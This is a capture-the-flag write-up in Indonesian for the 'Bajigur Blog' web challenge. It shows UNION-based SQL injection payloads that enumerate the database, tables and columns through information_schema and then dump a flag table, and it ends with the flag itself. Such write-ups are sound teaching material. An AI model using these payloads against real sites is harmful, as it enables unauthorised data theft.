# __ASGama CTF__ 
## _Bajigur Blog_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Web | 100 | l0l

**Description:** 

> http://ctf.asgama.web.id:40109/
>

### Bajigur Blog
Setelah recon, ditemukan bahwa ada celah SQL Injection.

Mengakses url  
`http://ctf.asgama.web.id:40109/?search=%27`  

Hasilnya :  
`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1 `


Setelah coba-coba dengan inject `union` ke dalam url, ditemukan bahwa terdapat 4 kolom. `?search=' and 0 union select 1,2,3,4 -- -`

Step:  
1. Cari nama database.  
`http://ctf.asgama.web.id:40109/?search=' AND 0 UNION SELECT 1,2,3,database() -- -`  
Database name : "gamactf_blog"
2. Cari nama table.  
`http://ctf.asgama.web.id:40109/?search=' AND 0 UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema="gamactf_blog" -- -`  
Table name : "flag,posts"  
3. Cari nama column.  
`http://ctf.asgama.web.id:40109/?search=' AND 0 UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name="flag" -- -`  
Table name : " id,content"  
4. Tampilkan isi table.
`http://ctf.asgama.web.id:40109/?search=' AND 0 UNION SELECT 1,2,3,content FROM flag -- -`  

### Payload
```
http://ctf.asgama.web.id:40109/?search=' AND 0 UNION SELECT 1,2,3,content FROM flag -- -
```

### Result
```
GamaCTF{1nf0rm4t10n_sCh3m4}
```

### Flag
GamaCTF{1nf0rm4t10n_sCh3m4}